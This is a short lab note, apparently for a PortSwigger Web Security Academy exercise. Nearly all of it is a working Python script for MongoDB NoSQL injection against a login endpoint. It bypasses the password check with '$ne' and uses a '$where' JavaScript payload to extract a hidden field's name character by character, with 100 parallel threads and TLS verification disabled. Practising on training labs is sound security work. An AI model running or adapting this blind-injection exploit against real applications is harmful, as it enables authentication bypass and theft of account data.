# NoSQL Fields Extraction Part 1 - MultiThreading

***NoSQL Fields Exfiltration Part 1- MultiThreading***

Must Change Variables - `URL / Object.keys(this)[FieldNumber].match` 

MongoDB Database

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def multiThreading():
    
    ts = time.perf_counter()
    session = requests.Session()
    
    url = "https://0a4400ab03b2324f80033acd009400d6.web-security-academy.net/login"
    

    chars = string.digits + string.ascii_letters
    index = list(range(0,10))
    password = ""

    def Threads(wordlist):
        for char in chars:
            req = session.post(
                url,
                json={
                    "username":"carlos",
                    "password":{
                        "$ne": "Password"
                    },
                    "$where": f"Object.keys(this)[4].match('^.{{{wordlist}}}{char}.*')"

                },
                verify=False,
        )
            if "Account locked" in req.text:
                return char
        return ""

    with ThreadPoolExecutor(max_workers=100) as executor:
        processes = executor.map(Threads,index)

    
    password = ''.join(processes)

    te = time.perf_counter()

    print(f"[+] Password extracted: {password}")
    print(f"[+] Time taken: {te - ts:.2f} seconds")

multiThreading()
```